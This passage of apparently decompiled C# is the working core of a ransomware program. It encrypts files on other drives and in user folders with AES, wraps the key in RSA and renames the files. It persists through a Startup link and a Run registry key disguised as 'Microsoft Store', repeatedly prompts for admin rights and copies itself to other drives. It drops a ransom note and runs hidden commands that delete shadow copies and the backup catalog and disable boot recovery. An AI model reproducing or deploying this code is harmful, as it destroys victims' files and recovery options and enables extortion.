		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
